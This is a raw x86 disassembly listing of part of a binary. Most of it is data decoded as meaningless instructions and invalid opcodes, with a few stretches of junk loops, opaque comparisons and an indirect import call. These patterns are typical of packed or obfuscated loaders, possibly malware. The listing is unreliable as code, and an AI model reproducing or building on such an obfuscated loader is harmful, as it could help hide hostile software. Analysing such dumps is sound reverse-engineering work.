  4098b9:	stc    
  4098ba:	sbb    eax,0x45423a4e
  4098bf:	js     0x4098de
  4098c1:	in     al,0xe0
  4098c3:	cmp    BYTE PTR [eax],dl
  4098c5:	and    esi,DWORD PTR [ebx-0x1f]
  4098c8:	mov    eax,0xa1de5e4a
  4098cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4098ce:	sbb    BYTE PTR [edi],ch
  4098d0:	sub    ebx,0xbb7b18e1
  4098d6:	and    al,0x15
  4098d8:	loopne 0x40989f
  4098da:	rcr    BYTE PTR [ecx-0x9],1
  4098dd:	and    BYTE PTR [esi+0x32],ch
  4098e0:	pop    esp
  4098e1:	push   es
  4098e2:	loopne 0x40989c
  4098e4:	imul   esp,ebp,0x15f7388e
  4098ea:	cmp    ebp,DWORD PTR [esp+ebx*4]
  4098ed:	mov    ds,WORD PTR [edx]
  4098ef:	add    DWORD PTR [ebx-0x47],0x2882bebd
  4098f6:	outs   dx,DWORD PTR ds:[esi]
  4098f7:	pop    esp
  4098f8:	pop    edx
  4098f9:	fst    DWORD PTR [ebx-0x64]
  4098fc:	push   ss
  4098fd:	out    dx,eax
  4098fe:	xchg   esp,eax
  4098ff:	out    dx,eax
  409900:	mov    edi,0x3e41fab4
  409905:	sti    
  409906:	sti    
  409907:	pop    ds
  409908:	or     dl,BYTE PTR [ecx-0x1f74cdb8]
  40990e:	jle    0x409947
  409910:	mov    edi,0xb09d94b
  409915:	pop    esi
  409916:	sahf   
  409917:	xor    edi,DWORD PTR [eax]
  409919:	xor    ebx,DWORD PTR [edx+0x7f]
  40991c:	dec    ecx
  40991d:	sub    BYTE PTR [esi+0x52],dh
  409920:	fucomi st,st(4)
  409922:	outs   dx,DWORD PTR ds:[esi]
  409923:	ret    
  409924:	lahf   
  409925:	add    BYTE PTR ds:0xc32905c9,dh
  40992b:	push   edx
  40992c:	int    0xab
  40992e:	push   cs
  40992f:	int3   
  409930:	and    eax,0x776a2eb7
  409935:	inc    esi
  409936:	rol    DWORD PTR ds:0x69c432c6,cl
  40993c:	stos   DWORD PTR es:[edi],eax
  40993d:	mov    esp,0x66ed6f13
  409942:	cmp    al,0x9b
  409944:	cmp    ebx,DWORD PTR ss:[eax+0x6813ad85]
  40994b:	sbb    edx,DWORD PTR [edi-0x15]
  40994e:	mov    eax,ds:0x12abc1
  409953:	fdivr  st,st(6)
  409955:	cmp    ebx,edi
  409957:	xchg   esi,eax
  409958:	add    bl,dh
  40995a:	iret   
  40995b:	repz es jae 0x409982
  40995f:	jae    0x4099bf
  409961:	jecxz  0x40999b
  409963:	mov    ch,0x7f
  409965:	stos   DWORD PTR es:[edi],eax
  409966:	mov    ebx,DWORD PTR [ebx]
  409968:	add    BYTE PTR [eax],dh
  40996a:	push   esi
  40996b:	int    0xff
  40996d:	inc    edx
  40996e:	push   edi
  40996f:	retf   
  409970:	push   ecx
  409971:	fisub  WORD PTR [edi-0xa]
  409974:	cmp    BYTE PTR [ebp-0x7e0281bf],0x95
  40997b:	int3   
  40997c:	lods   eax,DWORD PTR ds:[esi]
  40997d:	es inc eax
  40997f:	jne    0x409981
  409981:	and    BYTE PTR [edi],ch
  409983:	push   ds
  409984:	test   BYTE PTR [esi+0x55],dl
  409987:	jge    0x4099e3
  409989:	or     ch,cl
  40998b:	or     cl,dl
  40998d:	jae    0x409954
  40998f:	xchg   BYTE PTR gs:[eax],bh
  409992:	cmp    eax,0xf1180100
  409997:	loope  0x4099b2
  409999:	ret    0x2dc6
  40999c:	scas   eax,DWORD PTR es:[edi]
  40999d:	loop   0x409932
  40999f:	ror    DWORD PTR [ebp-0x1b9a28a4],0x52
  4099a6:	push   edx
  4099a7:	mov    ebp,0x77e4342e
  4099ac:	mov    bh,0x63
  4099ae:	cs xchg esi,eax
  4099b0:	stos   BYTE PTR es:[edi],al
  4099b1:	inc    esp
  4099b2:	daa    
  4099b3:	mov    ?,edi
  4099b5:	(bad)  
  4099b6:	loop   0x4099d9
  4099b8:	and    dl,al
  4099ba:	fld    DWORD PTR [edx]
  4099bc:	and    BYTE PTR [edi],bh
  4099be:	xchg   ebx,eax
  4099bf:	jae    0x4099d6
  4099c1:	push   esi
  4099c2:	push   ecx
  4099c3:	sub    al,0x46
  4099c5:	push   ecx
  4099c6:	mov    DWORD PTR ds:0x42a875,edx
  4099cc:	push   ecx
  4099cd:	mov    eax,0x5a3fc9f
  4099d2:	mov    DWORD PTR ds:0x42a885,0x49fb
  4099dc:	mov    DWORD PTR [ebp-0x4],eax
  4099df:	mov    DWORD PTR ds:0x42a875,edi
  4099e5:	mov    ecx,DWORD PTR [ebp-0x4]
  4099e8:	mov    DWORD PTR ds:0x42a7f9,0x12dd
  4099f2:	mov    DWORD PTR [ebp-0x8],0x4f35
  4099f9:	cmp    ecx,eax
  4099fb:	jne    0x40a060
  409a01:	xor    ecx,DWORD PTR ds:0x42a779
  409a07:	jmp    0x409cfa
  409a0c:	(bad)  
  409a0d:	retf   
  409a0e:	rcl    dh,1
  409a10:	xlat   BYTE PTR ds:[ebx]
  409a11:	fxch   st(2)
  409a13:	fst    DWORD PTR [ecx-0xa13eb31]
  409a19:	push   ds
  409a1a:	shl    DWORD PTR [esi+esi*4+0x527878f7],0x7e
  409a22:	js     0x409a9c
  409a24:	rcr    ebp,0xc4
  409a27:	mov    ebp,0xb792df93
  409a2c:	mov    ah,0x8b
  409a2e:	push   ebp
  409a2f:	add    bh,dh
  409a31:	js     0x409aab
  409a33:	xor    ch,ch
  409a35:	jecxz  0x409a6d
  409a37:	xor    al,al
  409a39:	stos   DWORD PTR es:[edi],eax
  409a3a:	cdq    
  409a3b:	sbb    eax,0x940f6c9b
  409a40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409a41:	add    ebp,DWORD PTR [esi-0x48]
  409a44:	sahf   
  409a45:	push   edx
  409a46:	loope  0x409a11
  409a48:	mov    esp,0x258ca262
  409a4d:	enter  0xf683,0x76
  409a51:	ret    0xce68
  409a54:	imul   ecx,DWORD PTR [ecx-0x15],0xe36f2afa
  409a5b:	test   BYTE PTR [ebx-0x63],al
  409a5e:	fcomip st,st(0)
  409a60:	lds    esi,FWORD PTR [edi]
  409a62:	sbb    esi,DWORD PTR [edx-0x13]
  409a65:	inc    edi
  409a66:	(bad)  
  409a67:	stc    
  409a68:	or     bl,BYTE PTR [esi+0x9]
  409a6b:	shl    DWORD PTR ds:0x5c023766,1
  409a71:	test   eax,0x507646aa
  409a76:	add    al,0x90
  409a78:	rcr    DWORD PTR [ebx+ecx*8-0x6adb39fb],0xa0
  409a80:	aam    0xee
  409a82:	mov    ds:0x28a1c38d,eax
  409a87:	mov    al,0x6d
  409a89:	cld    
  409a8a:	or     ecx,DWORD PTR [esi]
  409a8c:	or     ch,dl
  409a8e:	int    0xc
  409a90:	pushf  
  409a91:	imul   ecx,DWORD PTR [ebx+ebx*8],0x47b1d361
  409a98:	jae    0x409acc
  409a9a:	ins    DWORD PTR es:[edi],dx
  409a9b:	push   edx
  409a9c:	rcl    ah,cl
  409a9e:	xor    al,0xaf
  409aa0:	jb     0x409a87
  409aa2:	sbb    BYTE PTR [edi-0x61],al
  409aa5:	sbb    DWORD PTR [eax-0x4d],ecx
  409aa8:	and    bh,bh
  409aaa:	fnstsw WORD PTR [edi-0x4d835656]
  409ab0:	push   0x65513259
  409ab5:	test   ecx,edx
  409ab7:	outs   dx,BYTE PTR ds:[esi]
  409ab8:	ror    DWORD PTR [ecx+0x7a],0x3b
  409abc:	mov    edi,0x54600772
  409ac1:	mov    cl,0x99
  409ac3:	ins    DWORD PTR es:[edi],dx
  409ac4:	aas    
  409ac5:	jno    0x409a6f
  409ac7:	shl    BYTE PTR [esi-0x31],1
  409aca:	jp     0x409a6b
  409acc:	or     eax,0x9ea1f2ff
  409ad1:	in     eax,0x4e
  409ad3:	stc    
  409ad4:	jb     0x409a7b
  409ad6:	lock adc BYTE PTR [ecx+0x5b],ch
  409ada:	mov    al,ds:0x104d2a0c
  409adf:	daa    
  409ae0:	aad    0x7f
  409ae2:	sbb    dh,BYTE PTR [edi-0x24]
  409ae5:	ds jne 0x409aae
  409ae8:	add    DWORD PTR [esi+0x14],ecx
  409aeb:	aas    
  409aec:	sbb    ebx,DWORD PTR [edi+0x48]
  409aef:	add    dl,BYTE PTR [edi+edi*4-0x26379520]
  409af6:	pop    edi
  409af7:	ss push ecx
  409af9:	jmp    0x5009:0xed6e6beb
  409b00:	dec    ecx
  409b01:	mov    ds:0x11318b63,eax
  409b06:	aad    0x1d
  409b08:	push   DWORD PTR [ebx+0x54fa4037]
  409b0e:	and    ebp,DWORD PTR [ebp+0x7688b8f4]
  409b14:	inc    ebx
  409b15:	sahf   
  409b16:	mov    al,ds:0x1221670
  409b1b:	repnz repnz pop ebx
  409b1e:	call   0x12cf:0x6b714970
  409b25:	repnz xchg ecx,eax
  409b27:	pop    eax
  409b28:	mov    bh,0xa8
  409b2a:	repnz dec ebp
  409b2c:	dec    eax
  409b2d:	shr    BYTE PTR [ebp+0x54534cc2],cl
  409b33:	bound  esi,QWORD PTR ds:0x28427808
  409b39:	popa   
  409b3a:	and    DWORD PTR [eax],esi
  409b3c:	imul   edi,DWORD PTR [ecx+0x4e2baf78],0xffffffce
  409b43:	popf   
  409b44:	dec    edi
  409b45:	ucomiss xmm7,DWORD PTR [edi]
  409b48:	ja     0x409b85
  409b4a:	dec    eax
  409b4b:	add    ah,0xb2
  409b4e:	cmp    eax,0xe73390ef
  409b53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b54:	xchg   BYTE PTR ds:0x7530241a,ch
  409b5a:	jp     0x409b0e
  409b5c:	mov    fs,WORD PTR [ebp-0x17]
  409b5f:	pop    es
  409b60:	push   ds
  409b61:	shl    DWORD PTR [eax-0x17b1c144],cl
  409b67:	mov    ah,0xf6
  409b69:	out    dx,eax
  409b6a:	jg     0x409b99
  409b6c:	in     eax,dx
  409b6d:	test   al,0xd5
  409b6f:	stos   BYTE PTR es:[edi],al
  409b70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b71:	adc    edx,DWORD PTR [eax-0x4df690b6]
  409b77:	and    BYTE PTR [ecx+0x5e],bl
  409b7a:	inc    edi
  409b7b:	loop   0x409b42
  409b7d:	(bad)
  409b80:	dec    ebx
  409b81:	out    0xe2,al
  409b83:	sbb    eax,0x7e8436ab
  409b88:	sar    BYTE PTR [ebx],0x0
  409b8b:	call   0xf951:0xf3a9ba62
  409b92:	gs int 0x76
  409b95:	int    0xbe
  409b97:	jecxz  0x409b45
  409b99:	gs sub al,0x61
  409b9c:	test   BYTE PTR [esi-0x33],cl
  409b9f:	jae    0x409b46
  409ba1:	scas   eax,DWORD PTR es:[edi]
  409ba2:	in     eax,0xf2
  409ba4:	fstp   QWORD PTR [ebx-0xc]
  409ba7:	jge    0x409b5c
  409ba9:	cli    
  409baa:	jo     0x409bb9
  409bac:	add    eax,0x9eb6d37a
  409bb1:	lahf   
  409bb2:	dec    esi
  409bb3:	push   ds
  409bb4:	mov    esi,DWORD PTR [esi-0x339b57b8]
  409bba:	add    ah,bl
  409bbc:	imul   esp,ebx,0x88b0b696
  409bc2:	arpl   dx,di
  409bc4:	adc    ah,dh
  409bc6:	int    0x23
  409bc8:	xchg   ebp,eax
  409bc9:	fwait
  409bca:	iret   
  409bcb:	cmc    
  409bcc:	mov    esp,0xc39b68da
  409bd1:	outs   dx,DWORD PTR ds:[esi]
  409bd2:	xor    bl,bh
  409bd4:	cdq    
  409bd5:	ret    0x8314
  409bd8:	ficom  WORD PTR [edx+0x1b88b603]
  409bde:	sub    eax,0x8bbc10ec
  409be3:	aad    0x32
  409be5:	or     eax,0x757da1b1
  409bea:	cdq    
  409beb:	and    eax,esp
  409bed:	ffree  st(7)
  409bef:	imul   esi,DWORD PTR [ecx-0x4658dfc4],0x85b864f9
  409bf9:	fild   QWORD PTR [esi]
  409bfb:	adc    edi,edi
  409bfd:	adc    bl,bl
  409bff:	mov    ah,BYTE PTR [ebp-0x37]
  409c02:	test   DWORD PTR [edx],0x740d3489
  409c08:	shl    BYTE PTR [ecx],1
  409c0a:	xchg   ecx,eax
  409c0b:	push   edi
  409c0c:	jl     0x409c35
  409c0e:	push   ebx
  409c0f:	(bad)  
  409c10:	jle    0x409c44
  409c12:	repnz (bad) 
  409c15:	pop    ebp
  409c16:	jo     0x409bcd
  409c18:	mov    al,dl
  409c1a:	push   eax
  409c1b:	(bad)  
  409c1c:	int3   
  409c1d:	or     eax,0x390b3c99
  409c22:	adc    DWORD PTR [edx-0x61d4b20e],eax
  409c28:	xchg   ebp,eax
  409c29:	xor    al,0x85
  409c2b:	dec    esi
  409c2c:	add    bh,0x28
  409c2f:	pop    es
  409c30:	inc    ebx
  409c31:	xchg   ebp,eax
  409c32:	out    0x9a,al
  409c34:	lds    ecx,FWORD PTR [edx-0x56aa311c]
  409c3a:	mov    WORD PTR ds:0x4996d842,ds
  409c40:	adc    DWORD PTR [ecx-0x5dad18fc],0x93a7905a
  409c4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409c4b:	jg     0x409c60
  409c4d:	or     ecx,DWORD PTR [esi+0x7]
  409c50:	xor    eax,0xcc7793ce
  409c55:	pop    es
  409c56:	mov    ds:0xfe3e9415,al
  409c5b:	and    dl,BYTE PTR [edi]
  409c5d:	xchg   ch,bh
  409c5f:	sbb    BYTE PTR [edx+0x76],bh
  409c62:	fisttp WORD PTR [edx+ebp*8]
  409c65:	out    0xb4,eax
  409c67:	xchg   cl,bl
  409c69:	add    esi,ebx
  409c6b:	(bad)  
  409c6c:	int3   
  409c6d:	jo     0x409bf0
  409c6f:	lods   al,BYTE PTR ds:[esi]
  409c70:	cwde   
  409c71:	cli    
  409c72:	sahf   
  409c73:	call   0x54e8:0xe6804be7
  409c7a:	add    al,0x8f
  409c7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409c7d:	shl    BYTE PTR [edx],0xe9
  409c80:	sub    eax,0xdac1bae9
  409c85:	retf   
  409c86:	adc    ah,ah
  409c88:	lahf   
  409c89:	cdq    
  409c8a:	or     dh,BYTE PTR [ebp+eax*2-0x1c865f2a]
  409c91:	mov    bl,0xbe
  409c93:	call   0x862f:0xe8439e19
  409c9a:	cmp    BYTE PTR [edx],dh
  409c9c:	cmc    
  409c9d:	push   esi
  409c9e:	test   eax,0x9a746f0b
  409ca3:	adc    ebx,DWORD PTR [edi]
  409ca5:	mov    bh,dh
  409ca7:	adc    eax,0x96d89d1f
  409cac:	stc    
  409cad:	out    0xbc,eax
  409caf:	or     DWORD PTR [eax],ecx
  409cb1:	in     eax,dx
  409cb2:	neg    esp
  409cb4:	mov    WORD PTR [ecx],es
  409cb6:	and    al,0x5f
  409cb8:	pop    edi
  409cb9:	retf   
  409cba:	pop    ecx
  409cbb:	aaa    
  409cbc:	xor    al,0x6b
  409cbe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409cbf:	int3   
  409cc0:	xchg   BYTE PTR [esi+0x3d6c1247],bl
  409cc6:	icebp  
  409cc7:	cwde   
  409cc8:	retf   0x6289
  409ccb:	gs jecxz 0x409cda
  409cce:	call   0x9f60069e
  409cd3:	adc    ebx,DWORD PTR [esi]
  409cd5:	mov    ds:0xdab16c34,eax
  409cda:	fstp   TBYTE PTR [ecx+ebx*2-0x25ae5802]
  409ce1:	call   DWORD PTR [ecx+0x1017219f]
  409ce7:	daa    
  409ce8:	jne    0x409d53
  409cea:	test   al,0xc8
  409cec:	loope  0x409cbf
  409cee:	or     DWORD PTR [edx],ebp
  409cf0:	dec    edx
  409cf1:	pop    es
  409cf2:	mov    WORD PTR [edx+0x31],es
  409cf5:	daa    
  409cf6:	ins    BYTE PTR es:[edi],dx
  409cf7:	push   0x8b66accd
  409cfc:	inc    ebp
  409cfd:	clc    
  409cfe:	sbb    DWORD PTR ds:0x42a779,0x42a805
  409d08:	mov    ecx,0x8a36
  409d0d:	xor    ax,cx
  409d10:	and    ecx,0x5dd3
  409d16:	mov    ecx,0x3afc
  409d1b:	add    ax,cx
  409d1e:	neg    ecx
  409d20:	mov    ecx,DWORD PTR [ebp+0x8]
  409d23:	or     DWORD PTR ds:0x42a77d,0x299c
  409d2d:	movzx  eax,ax
  409d30:	sbb    DWORD PTR ds:0x42a841,0x42a83d
  409d3a:	not    eax
  409d3c:	xor    DWORD PTR ds:0x42a831,0x55d1
  409d46:	and    eax,DWORD PTR [ecx]
  409d48:	jmp    0x40a03b
  409d4d:	ret    
  409d4e:	int3   
  409d4f:	leave  
  409d50:	(bad)  
  409d51:	(bad)  
  409d53:	rcr    ecx,cl
  409d55:	sahf   
  409d56:	inc    edx
  409d57:	imul   edx,DWORD PTR [edi-0x7b54c414],0xffffff88
  409d5e:	hlt    
  409d5f:	js     0x409dd9
  409d61:	push   edx
  409d62:	jle    0x409ddc
  409d64:	js     0x409d63
  409d66:	pop    ebp
  409d67:	mov    bh,0x3
  409d69:	push   DWORD PTR [esi]
  409d6b:	and    BYTE PTR [edi+edi*8+0x4915ae67],dh
  409d72:	mov    edi,0xdfdf0cc5
  409d77:	adc    DWORD PTR [edx+0x14],0xc2d94f60
  409d7e:	mov    ds:0xc9031afe,al
  409d83:	call   0xc1942f26
  409d88:	aas    
  409d89:	adc    DWORD PTR [ebx-0x59],eax
  409d8c:	mov    eax,ds:0x9f6636ac
  409d91:	mov    al,cl
  409d93:	lock popa 
  409d95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409d96:	or     eax,0x4158f7a6
  409d9b:	adc    ah,BYTE PTR ds:[edi+ebx*1-0x41]
  409da0:	popf   
  409da1:	out    dx,al
  409da2:	ins    BYTE PTR es:[edi],dx
  409da3:	cmp    DWORD PTR [eax+0x51],esp
  409da6:	neg    DWORD PTR [ebp+0x7f822b58]
  409dac:	stos   DWORD PTR es:[edi],eax
  409dad:	inc    esi
  409dae:	(bad)  
  409daf:	jmp    0x409d88
  409db1:	mov    edi,0x263eaee
  409db6:	mov    ch,0x38
  409db8:	ret    0x60a8
  409dbb:	push   esi
  409dbc:	adc    esp,DWORD PTR [esi+ebx*1+0x5b]
  409dc0:	ds loope 0x409dfa
  409dc3:	add    al,0x8
  409dc5:	xor    BYTE PTR [edi],0xc9
  409dc8:	aam    0x77
  409dca:	mov    edi,0xe3b8f73d
  409dcf:	pop    ecx
  409dd0:	sub    ebp,DWORD PTR [ebx+0x13]
  409dd3:	cmp    al,0x6
  409dd5:	enter  0x66e0,0x83
  409dd9:	xchg   ebx,eax
  409dda:	push   0x62cc7c49
  409ddf:	jbe    0x409dcf
  409de1:	ror    cl,cl
  409de3:	add    eax,0x12957690
  409de8:	fisub  DWORD PTR [ecx-0x6333b1f7]
  409dee:	adc    edx,ecx
  409df0:	mov    cl,0xb
  409df2:	mov    eax,0x9e6fbd95
  409df7:	sub    eax,0x35eec0b5
  409dfc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409dfd:	rol    DWORD PTR cs:[ecx-0x47ac0d93],0xa6
  409e05:	push   eax
  409e06:	(bad)  
  409e07:	add    BYTE PTR [edi-0x60],dh
  409e0a:	popa   
  409e0b:	into   
  409e0c:	stos   DWORD PTR es:[edi],eax
  409e0d:	sbb    esp,DWORD PTR [ecx-0x377b89e7]
  409e13:	mov    BYTE PTR [ebp+edi*2+0x42],dl
  409e17:	lods   eax,DWORD PTR ds:[esi]
  409e18:	push   ds
  409e19:	mov    ch,0x39
  409e1b:	cli    
  409e1c:	xlat   BYTE PTR ds:[ebx]
  409e1d:	rol    DWORD PTR [edi-0x1540c65a],1
  409e23:	inc    eax
  409e24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e25:	xor    al,0x6b
  409e27:	or     al,0x45
  409e29:	push   esp
  409e2a:	push   edx
  409e2b:	and    ebx,DWORD PTR [edx]
  409e2d:	in     al,dx
  409e2e:	scas   eax,DWORD PTR es:[edi]
  409e2f:	mov    ds:0x43c8b1f6,eax
  409e34:	lods   al,BYTE PTR ds:[esi]
  409e35:	add    al,BYTE PTR [edi+0x6a4317fd]
  409e3b:	cwde   
  409e3c:	push   ds
  409e3d:	xor    eax,0x104cdbaf
  409e42:	in     eax,dx
  409e43:	hlt    
  409e44:	push   edi
  409e45:	push   ebx
  409e46:	pop    eax
  409e47:	inc    ebp
  409e48:	or     bh,BYTE PTR [esi+0x28]
  409e4b:	les    eax,FWORD PTR [eax]
  409e4d:	push   eax
  409e4e:	sbb    al,BYTE PTR [ebx-0x8]
  409e51:	inc    esp
  409e52:	or     eax,0xbe3ad475
  409e57:	std    
  409e58:	sbb    dh,BYTE PTR [ecx]
  409e5a:	or     ah,BYTE PTR [ebp-0x4f7823f5]
  409e60:	imul   edi,ecx,0x225b4b44
  409e66:	xor    al,0x1a
  409e68:	mov    ah,0xe0
  409e6a:	stc    
  409e6b:	mov    BYTE PTR [ecx-0x224dfdaa],cl
  409e71:	jae    0x409eb3
  409e73:	xor    esp,ebp
  409e75:	mov    DWORD PTR [edi-0x24],edi
  409e78:	mov    esp,0xe64320a1
  409e7d:	jbe    0x409e08
  409e7f:	stc    
  409e80:	mov    bh,0x96
  409e82:	adc    ebx,DWORD PTR [ebx+0x66]
  409e85:	test   eax,0x7f01ae57
  409e8a:	les    ecx,FWORD PTR [edi]
  409e8c:	xor    DWORD PTR [ebp-0x41],eax
  409e8f:	mov    edi,0x8196836d
  409e94:	pop    ebp
  409e95:	(bad)  
  409e96:	push   0xac55036b
  409e9b:	jmp    0xb21a1a78
  409ea0:	and    esp,edi
  409ea2:	(bad)  
  409ea4:	xor    BYTE PTR ds:0xb3bf373a,al
  409eaa:	sub    DWORD PTR [eax-0x76],esi
  409ead:	imul   ah
  409eaf:	jg     0x409eb0
  409eb1:	nop
  409eb2:	jae    0x409ea6
  409eb4:	cdq    
  409eb5:	sub    edi,DWORD PTR [edx+0x402689ed]
  409ebb:	int    0xd3
  409ebd:	xor    BYTE PTR [eax-0x1c4c2888],bl
  409ec3:	sub    eax,0x633b6bf4
  409ec8:	adc    eax,0xf94a1481
  409ecd:	add    edi,ebx
  409ecf:	inc    edi
  409ed0:	and    al,0x3d
  409ed2:	pop    eax
  409ed3:	adc    cl,BYTE PTR [edx]
  409ed5:	dec    edi
  409ed6:	in     eax,dx
  409ed7:	ins    BYTE PTR es:[edi],dx
  409ed8:	out    dx,al
  409ed9:	cmc    
  409eda:	imul   ebx,DWORD PTR [edi+0x73],0x56
  409ede:	dec    eax
  409edf:	sbb    dl,bh
  409ee1:	clc    
  409ee2:	stos   BYTE PTR es:[edi],al
  409ee3:	lods   al,BYTE PTR ss:[esi]
  409ee5:	popf   
  409ee6:	xor    ecx,DWORD PTR [esi]
  409ee8:	js     0x409f1b
  409eea:	mov    eax,0xcfe71c23
  409eef:	jns    0x409ed2
  409ef1:	pop    esp
  409ef2:	retf   0x437e
  409ef5:	lahf   
  409ef6:	rcl    esi,1
  409ef8:	and    ebx,ebx
  409efa:	mov    eax,ds:0xa7a6dfc5
  409eff:	push   edi
  409f00:	mov    al,ds:0xe55bba23
  409f05:	jecxz  0x409f28
  409f07:	add    ecx,edx
  409f09:	push   0xffffffcc
  409f0b:	(bad)  
  409f0c:	aaa    
  409f0d:	dec    ebx
  409f0e:	dec    edi
  409f0f:	mov    edx,0xa39dd1e7
  409f14:	push   eax
  409f15:	inc    edi
  409f16:	jmp    0x6d3:0x697447b2
  409f1d:	xchg   DWORD PTR [esp+eax*8-0x5f58cebe],eax
  409f24:	sbb    dh,bh
  409f26:	stc    
  409f27:	push   eax
  409f28:	bound  ecx,QWORD PTR [edi+0xa]
  409f2b:	in     eax,dx
  409f2c:	stc    
  409f2d:	mov    edi,edx
  409f2f:	add    DWORD PTR [esi],edx
  409f31:	jo     0x409edc
  409f33:	push   eax
  409f34:	imul   edi,DWORD PTR [eax+0x21],0xfef0c9f4
  409f3b:	dec    esp
  409f3c:	mov    ecx,0x260f737e
  409f41:	stos   BYTE PTR es:[edi],al
  409f42:	shl    DWORD PTR [esi+0x4],1
  409f45:	repnz cmp esp,DWORD PTR ds:0x314d66ed
  409f4c:	or     BYTE PTR [ebx+ecx*8-0x2a],bl
  409f50:	inc    ebp
  409f51:	jg     0x409f1d
  409f53:	leave  
  409f54:	fistp  QWORD PTR [bx]
  409f57:	pop    esi
  409f58:	dec    ebx
  409f59:	dec    esp
  409f5a:	dec    esi
  409f5b:	out    dx,al
  409f5c:	xor    ch,BYTE PTR [ebx+0x41]
  409f5f:	call   0xe7e6e7b9
  409f64:	arpl   di,ax
  409f66:	ss pop ss
  409f68:	and    ebx,ecx
  409f6a:	xor    edi,DWORD PTR [esi+0x1c2fc310]
  409f70:	push   edi
  409f71:	mov    bh,0x8d
  409f73:	inc    esi
  409f74:	xchg   edx,eax
  409f75:	xor    al,BYTE PTR [esi-0x2e]
  409f78:	pop    ebx
  409f79:	retf   
  409f7a:	inc    ebp
  409f7b:	jl     0x409f95
  409f7d:	aam    0x97
  409f7f:	xchg   al,ch
  409f81:	dec    esp
  409f82:	call   0x59d2:0x48d14fc6
  409f89:	mov    esp,0x3b4938d2
  409f8e:	scas   eax,DWORD PTR es:[edi]
  409f8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409f90:	inc    edx
  409f91:	cwde   
  409f92:	dec    eax
  409f93:	mov    dh,0xd
  409f95:	pop    ebp
  409f96:	inc    eax
  409f97:	(bad)  
  409f98:	out    0x56,eax
  409f9a:	test   esp,ebx
  409f9c:	add    eax,0x93a2a6d1
  409fa1:	mov    al,0xf0
  409fa3:	outs   dx,DWORD PTR ds:[esi]
  409fa4:	out    0xe2,al
  409fa6:	inc    ecx
  409fa7:	call   0x79c5:0x6643d588
  409fae:	das    
  409faf:	and    bh,ch
  409fb1:	addr16 cmp eax,edx
  409fb4:	nop
  409fb5:	add    eax,0x75792c9e
  409fba:	repnz or BYTE PTR gs:[ecx-0x2d],dl
  409fbf:	xor    edx,DWORD PTR [edx]
  409fc1:	xchg   esp,eax
  409fc2:	js     0x409ff2
  409fc4:	lock and al,0x38
  409fc7:	sbb    eax,0x389f5039
  409fcc:	push   0xffffffb4
  409fce:	imul   edx,DWORD PTR [eax-0xe],0x59
  409fd2:	jle    0x409fae
  409fd4:	push   ecx
  409fd5:	jnp    0x409f74
  409fd7:	rcl    ch,0x1a
  409fda:	pop    ss
  409fdb:	add    DWORD PTR [ebx],ebp
  409fdd:	ins    BYTE PTR es:[edi],dx
  409fde:	fmul   QWORD PTR [ebx+0x3a]
  409fe1:	dec    esp
  409fe2:	stos   BYTE PTR es:[edi],al
  409fe3:	cdq    
  409fe4:	clc    
  409fe5:	lods   eax,DWORD PTR ds:[esi]
  409fe6:	push   eax
  409fe7:	mov    ds,WORD PTR [ebp+0x68cc2ca4]
  409fed:	xor    edx,DWORD PTR [eax+0x6e]
  409ff0:	or     DWORD PTR [eax+ebx*2],edx
  409ff3:	sbb    BYTE PTR [edi+0x57c57db5],bh
  409ff9:	dec    edi
  409ffa:	int3   
  409ffb:	hlt    
  409ffc:	adc    eax,0xf363108a
  40a001:	xchg   esi,eax
  40a002:	add    eax,0x4f5cf169
  40a007:	dec    edi
  40a008:	add    bh,BYTE PTR [ecx-0x38]
  40a00b:	push   edi
  40a00c:	inc    DWORD PTR [edx+0x3e]
  40a00f:	sub    al,0x98
  40a011:	fcomp  DWORD PTR [esi+0x38]
  40a014:	jns    0x40a021
  40a016:	xor    BYTE PTR [ecx+0x3d99f1cf],bh
  40a01c:	lods   eax,DWORD PTR ds:[esi]
  40a01d:	cmc    
  40a01e:	lods   al,BYTE PTR ds:[esi]
  40a01f:	rcl    DWORD PTR ds:0xe74a9985,cl
  40a025:	(bad)  
  40a026:	and    esi,DWORD PTR [edi]
  40a028:	in     al,dx
  40a029:	or     ebp,ecx
  40a02b:	dec    edx
  40a02c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a02d:	in     al,dx
  40a02e:	test   eax,0x1a673a95
  40a033:	std    
  40a034:	pop    ebp
  40a035:	sbb    bl,BYTE PTR [ecx]
  40a037:	fs mov edi,0x4d8b032d
  40a03d:	or     BYTE PTR [ecx+0x7e901],cl
  40a043:	add    BYTE PTR [eax],al
  40a045:	xor    DWORD PTR [ebp-0x4],0xe149ebf
  40a04c:	mov    ax,WORD PTR [ebp-0x8]
  40a050:	push   DWORD PTR [ebp+0x8]
  40a053:	call   0x40a064
  40a058:	test   eax,eax
  40a05a:	je     0x40a045
  40a060:	leave  
  40a061:	ret    0x4
  40a064:	push   ebp
  40a065:	mov    ebp,esp
  40a067:	sub    esp,0x2c
  40a06a:	and    DWORD PTR ds:0x42a765,0x0
  40a074:	jmp    0x40a084
  40a079:	mov    eax,ds:0x42a765
  40a07e:	inc    eax
  40a07f:	mov    ds:0x42a765,eax
  40a084:	cmp    DWORD PTR ds:0x42a765,0x12
  40a08b:	jae    0x40a110
  40a091:	cmp    DWORD PTR ds:0x42a765,0x22
  40a098:	jne    0x40a0b2
  40a09e:	push   DWORD PTR [ebp-0x14]
  40a0a1:	push   0x6f60
  40a0a6:	push   DWORD PTR [ebp-0x24]
  40a0a9:	push   DWORD PTR [ebp-0x10]
  40a0ac:	call   DWORD PTR ds:0x41d198
  40a0b2:	jmp    0x40a079
  40a0b7:	and    DWORD PTR ds:0x42a871,0x0
  40a0c1:	jmp    0x40a0d1
  40a0c6:	mov    eax,ds:0x42a871
  40a0cb:	inc    eax
  40a0cc:	mov    ds:0x42a871,eax
  40a0d1:	cmp    DWORD PTR ds:0x42a871,0x11
  40a0d8:	jae    0x40a110
  40a0de:	cmp    DWORD PTR ds:0x42a871,0x1e
